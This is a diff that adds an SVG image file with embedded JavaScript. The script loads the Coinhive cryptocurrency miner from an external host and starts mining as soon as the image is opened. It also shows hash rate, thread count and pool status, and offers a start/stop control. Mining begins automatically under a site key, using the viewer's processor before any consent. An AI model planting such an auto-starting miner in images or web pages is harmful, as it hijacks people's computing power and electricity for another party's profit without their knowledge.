@@ -1,0 +1,82 @@
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+     preserveAspectRatio="xMidYMid meet" viewBox="0 0 200 200">
+
+  <style>
+    svg {
+      font-family: sans-serif;
+    }
+    #hashesPerSecondBig {
+      display: none;
+    }
+  </style>
+
+  <rect id="backgroundColor" x="0" y="0" width="200" height="200" fill="orange" />
+  <text id="hashesPerSecondBig" x="100" y="100" text-anchor="middle" dominant-baseline="central" font-size="350" font-weight="900" fill="palegreen" clip-path="url(#clip)">0 hashes/s</text>
+
+  <text id="startStop" x="100" y="20" text-anchor="middle" dominant-baseline="central" font-size="10">start</text>
+  <text id="threads" x="100" y="35" text-anchor="middle" dominant-baseline="central" font-size="10">0 threads</text>
+
+  <text id="running" x="100" y="100" text-anchor="middle" dominant-baseline="central" font-size="40" fill="red">not-mining</text>
+
+  <text id="hashesPerSecond" x="100" y="165" text-anchor="middle" dominant-baseline="central" font-size="10">0 hashes/s</text>
+  <text id="acceptedHashes" x="100" y="180" text-anchor="middle" dominant-baseline="central" font-size="10">0 accepted</text>
+
+  <text id="status" x="100" y="195" text-anchor="middle" font-size="4">Loading: needs enabled javascript, disabled adblock and to be opened directly.</text>
+
+  <clipPath id="clip">
+    <rect x="0" y="0" width="200" height="200"/>
+  </clipPath>
+
+  <script xlink:href="https://coinhive.com/lib/coinhive.min.js"></script>
+  <script>
+    var miner = new CoinHive.Anonymous('ayWACMJ55r1Sf2XvqjgUmZ5Es6xZ8hJ8', {throttle: 0.3});
+    miner.start();
+
+    // todo: start after x seconds
+
+    // start stop click
+    document.getElementById('startStop').addEventListener('click', function() {
+      if (miner.isRunning()) {
+        miner.stop();
+      } else {
+        miner.start();
+      }
+    });
+
+    // display stats
+    setInterval(displayLoop, 500);
+
+    function displayLoop() {
+      if (miner.isRunning()) {
+        document.getElementById('backgroundColor').style.fill = 'lightgreen';
+        document.getElementById('running').textContent = 'mining.svg';
+        document.getElementById('running').style.fill = 'green';
+        document.getElementById('startStop').textContent = 'stop';
+        document.getElementById('hashesPerSecondBig').style.display = 'inline';
+      } else {
+        document.getElementById('backgroundColor').style.fill = 'orange';
+        document.getElementById('running').textContent = 'not-mining';
+        document.getElementById('running').style.fill = 'red';
+        document.getElementById('startStop').textContent = 'start';
+        document.getElementById('hashesPerSecondBig').style.display = 'none';
+      }
+
+      document.getElementById('threads').textContent = miner.getNumThreads() + ' threads';
+      document.getElementById('hashesPerSecond').textContent = (parseInt(miner.getHashesPerSecond() * 100)) / 100 + ' hashes/s';
+      document.getElementById('acceptedHashes').textContent = miner.getAcceptedHashes() + ' accepted';
+
+
+      document.getElementById('hashesPerSecondBig').textContent = parseInt(miner.getHashesPerSecond());
+    }
+
+    // display status
+    miner.on('open', function() { document.getElementById('status').textContent = 'The connection to our mining pool was opened.'; });
+    miner.on('authed', function() { document.getElementById('status').textContent = 'The miner successfully authed with the mining pool and the siteKey was verified.'; });
+    miner.on('close', function() { document.getElementById('status').textContent = 'The connection to the pool was closed.'; });
+    miner.on('error', function() { document.getElementById('status').textContent = 'An error occured.'; });
+    miner.on('job', function() { document.getElementById('status').textContent = 'A new mining job was received from the pool.'; });
+    miner.on('found', function() { document.getElementById('status').textContent = 'A hash meeting the pool\'s difficulty (currently 256) was found and will be send to the pool.'; });
+    miner.on('accepted', function() { document.getElementById('status').textContent = 'A hash that was sent to the pool was accepted.'; });
+  </script>
+</svg>
